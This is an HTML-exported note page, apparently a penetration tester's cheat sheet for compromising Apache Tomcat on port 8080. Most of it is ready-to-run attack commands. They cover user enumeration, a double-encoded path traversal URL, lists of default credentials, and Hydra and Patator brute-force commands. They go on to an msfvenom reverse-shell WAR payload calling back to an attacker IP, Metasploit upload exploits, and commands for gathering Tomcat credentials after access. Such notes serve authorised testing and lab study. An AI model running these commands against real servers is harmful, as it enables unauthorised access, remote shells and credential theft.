<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>8080 - Apache Tomcat</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 8080 - Apache Tomcat</h1></strong><br />Apache Tomcat is an open source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and JavaWebSocket technologies, and provides a &quot;pure Java&quot; HTTP web server environment in which Java code can run. <br /><br />Tomcat is a Servlet and JSP Server that serves Java technologies.<br /><br />Tomcat consists of:<br />• <code>Coyote</code> - the actual web server that manages HTTP connections<br />• <code>Catalina</code> - the Java Servlet container<br />• <code>Jasper</code> - the JSP (JavaServer Pages) engine that comiles java code for <code>Catalina</code> to process<br /><br /><strong><h2>## Checklist</h2></strong><br />• Tomcat 6 and below? - Enumerate users<br />   ◇ <code>msf&gt; use auxiliary/scanner/http/tomcat_enum</code><br />• Log in at Manager Panel - <code>http://tomcat.site/manager/html</code><br />   ◇ If you can&#39;t access, try CVE-2007-1860 - Double URL encode path traversal<br />      ▪ <code>http://tomcat.site/%252E%252E/manager/html</code><br /><br />   ◇ Try default credentials<br />      ▪ <div class="codebox"><div class="codebox">admin:admin<br />admin:tomcat<br />admin:&lt;NOTHING&gt;<br />admin:s3cr3t<br />tomcat:tomcat<br />tomcat:s3cr3t</div></div><br />   <br />   ◇ Bruteforce default credentials<br />      ▪ Wordlists<br />         - <div class="codebox"><div class="codebox">/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt<br />/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt<br />/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt<br />/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt</div></div><br />      ▪ Patator<br />         - <code>patator http_fuzz url=http://10.11.1.209:8080/manager/html user_pass=COMBO00:COMBO01 0=/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -x ignore:code=401</code><br />      ▪ Hydra<br />         - <code>hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -s 8080 10.10.10.95 http-get /manager/html</code><br />      ▪ Metasploit<br />         - <code>use auxiliary/scanner/http/tomcat_mgr_login</code><br /><br /><strong><h3>### With access</h3></strong><br />• Upload .war file to get code execution/shell<br />   ◇ Generate shell and upload - <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.25 LPORT=9001 -f war -o lulz.war</code><br />   ◇ Metasploit - <code>use exploit/multi/http/tomcat_mgr_upload</code><br /><br /><strong><h2>## Post-Exploitation</h2></strong><br /><strong><h3>### Grab tomcat credentials</h3></strong><br /><code>find / -name tomcat-users.xml 2&gt;/dev/null</code><br /><code>msf&gt; use post/multi/gather/tomcat_gather</code><br /><code>msf&gt; use post/windows/gather/enum_tomcat</code><br /><br /><br /></div>
</body>
</html>
